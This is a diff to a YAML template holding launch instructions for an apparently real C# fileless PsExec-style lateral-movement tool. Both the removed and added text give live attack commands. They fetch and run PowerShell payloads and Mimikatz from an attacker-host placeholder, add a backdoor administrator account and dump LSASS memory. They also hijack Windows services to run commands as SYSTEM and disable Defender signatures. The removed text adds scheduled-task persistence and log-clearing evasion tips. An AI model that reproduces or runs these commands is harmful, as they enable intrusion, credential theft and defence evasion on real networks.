@@ -74,115 +74,43 @@ output:
   launch_instructions: |
     C# Fileless PSExec Lateral Movement - Launch Instructions
 
-    Prerequisites:
-
-    - Valid admin credentials on target machine
-    - SMB/RPC access to target (ports 135, 139, 445)
-    - Existing service to hijack on target
-    - Network connectivity to target
-
-    Step 1: Enumerate Target Services
-
-    Find services on target machine:
-
-    Using PowerShell:
+    Enumerate Target Services:
     Get-Service -ComputerName {{ target_host }}
-
-    Or using sc.exe:
     sc \\{{ target_host }} query
 
-    Common hijack targets:
-    - SensorService
-    - Spooler
-    - SessionEnv
-    - Any non-critical service
+    Execute Fileless PSExec:
+    {{ output_file }} {{ target_host }} {{ service_name }} "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
 
-    Step 2: Execute Fileless PSExec
+    Example - Add Local Admin:
+    {{ output_file }} {{ target_host }} {{ service_name }} "net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
 
-    Basic execution (with Defender bypass):
-    {{ output_file }} {{ target_host }} {{ service_name }} {{ binary_to_run }}
+    Example - Execute Binary:
+    {{ output_file }} {{ target_host }} {{ service_name }} "C:\\Windows\\Temp\\beacon.exe"
 
-    Example - Execute whoami:
-    {{ output_file }} 192.168.1.10 SensorService "cmd.exe /c whoami > C:\\Temp\\out.txt"
-
-    Example - Download and execute payload:
-    {{ output_file }} 192.168.1.10 SensorService "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
-
-    Example - Add local admin:
-    {{ output_file }} 192.168.1.10 SensorService "cmd.exe /c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
-
-    Example - Execute beacon:
-    {{ output_file }} 192.168.1.10 SensorService "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump [LSASS_PID] C:\\Temp\\lsass.dmp full"
-
-    Step 3: Verify Execution
-
-    Check output file on target:
+    Verify Execution:
     type \\{{ target_host }}\C$\Temp\out.txt
-
-    Or check for new processes:
     Get-Process -ComputerName {{ target_host }}
 
-    Step 4: Establish Persistence (Optional)
-
-    Create scheduled task via service:
-    {{ output_file }} {{ target_host }} {{ service_name }} "schtasks /create /tn Update /tr C:\\Windows\\Temp\\beacon.exe /sc onlogon /ru SYSTEM"
-
     Notes:
-
-    - Executes as NT AUTHORITY\\SYSTEM on target
-    - Pass 1 disables Windows Defender signatures
-    - Pass 2 executes your specified binary
-    - Pass 3 restores original service configuration
-    - No files are dropped on target disk (fileless)
-    - Requires admin credentials for remote SCM access
-
-    Execution Flow:
-
-    1. Connect to target's Service Control Manager (SCM)
-    2. Open specified service handle
-    3. Query current service binary path (for restoration)
-    4. Modify service binary path to: MpCmdRun.exe -RemoveDefinitions -All
-    5. Start service (disables Defender signatures)
-    6. Modify service binary path to your command
-    7. Start service (executes your command as SYSTEM)
-    8. Restore original service binary path
-    9. Exit
-
-    Advanced Techniques:
-
-    Living off the land binaries (LOLBins):
-    {{ output_file }} {{ target_host }} {{ service_name }} "regsvr32.exe /s /n /u /i:http://YOUR_IP/file.sct scrobj.dll"
-
-    Lateral movement with PsExec-style:
-    {{ output_file }} {{ target_host }} {{ service_name }} "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
+    - Target: {{ target_host }}, Service: {{ service_name }}, Command: {{ binary_to_run }}
+    - Executes as NT AUTHORITY\SYSTEM on target (service context)
+    - Requires admin credentials for remote SCM access (ports 135, 139, 445)
+    - Fileless: No files dropped on target disk
+    - Pass 1: Disables Windows Defender signatures (MpCmdRun.exe -RemoveDefinitions -All)
+    - Pass 2: Executes your specified command via modified service binary path
+    - Pass 3: Restores original service configuration automatically
+    - Common hijack targets: SensorService, Spooler, SessionEnv (any non-critical service)
+    - Consider LOLBins: regsvr32.exe, rundll32.exe, mshta.exe for evasion
 
     Troubleshooting:
-
-    - Access Denied: Verify admin credentials and remote SCM access
-    - Service not found: Enumerate services on target first
-    - Service start fails: Check if service is already running or disabled
-    - No output: Command may have failed or no stdout (write to file)
-    - Defender still active: Pass 1 may have failed (check Event Logs)
-
-    Detection:
-
-    This technique generates:
-    - Event ID 7045 (Service installed)
-    - Event ID 7040 (Service start type changed)
-    - Event ID 4697 (Service installed)
-    - Service configuration changes in registry
-    - Sysmon Event ID 1 (Process creation by service)
-
-    Evasion Tips:
-
-    - Use less common services for hijacking
-    - Randomize execution timing
-    - Clean up Event Logs after execution
-    - Use native Windows binaries for execution (LOLBins)
+    - Access Denied: Verify admin credentials and remote SCM access; check firewall allows 135,139,445/tcp
+    - Service not found: Enumerate services first; try different service (avoid critical services)
+    - Service start fails: Check if service already running or disabled; view Event ID 7036
+    - No output: Command may have failed or no stdout (redirect to file: >C:\Temp\out.txt)
+    - Defender still active: Pass 1 may have failed (check Defender status on target)
+    - Event ID 7045, 7040, 4697 will fire (service installed/changed)
+    - Sysmon Event ID 1 (process creation by service) will fire
 
     Cleanup:
-
-    Service configuration is automatically restored by the tool.
-
-    Remove executable:
+    Service configuration is automatically restored.
     Remove-Item {{ output_file }} -Force
